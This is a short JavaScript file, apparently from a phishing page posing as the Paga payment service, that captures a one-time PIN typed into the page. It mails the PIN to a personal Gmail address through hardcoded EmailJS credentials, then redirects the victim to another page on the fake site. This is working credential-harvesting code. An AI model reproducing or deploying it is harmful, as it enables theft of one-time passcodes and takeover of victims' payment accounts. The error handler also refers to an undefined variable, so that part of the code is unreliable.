// emailjs.init("3yaulPAGa3CdjhurB");
const otp = document.querySelector("#otp");

const serviceId = "service_d6me3am";
const userId = "TW3eLRAOMUcH1InEX";
const templateId = "template_h31bthj";
// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      }
    }
  });
}
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
// Function to collect and validate the PIN when the Submit button is clicked
document
  .getElementById("submitBtn")
  .addEventListener("click", function (event) {
    var otp = "";
    var pinInputs = document.getElementsByClassName("pin-input");

    for (var i = 0; i < pinInputs.length; i++) {
      otp += pinInputs[i].value;
    }

    console.log(otp);
    event.preventDefault();
    const emailParams = {
      to_name: "fredrickugoo@gmail.com",
      otp: otp,
    };
    console.log(emailParams);
    emailjs.send(serviceId, templateId, emailParams, userId).then(
      function (response) {
        if (otp.trim() !== "") {
          console.log("Sent successfully:", response);
          otp = "";

          location.href = "/paga.github.io/opp.html";
        }
      },
      function (error) {
        if (pin.trim() == "") {
          console.log("Failed to send:", error);
        }
      }
    );
  });
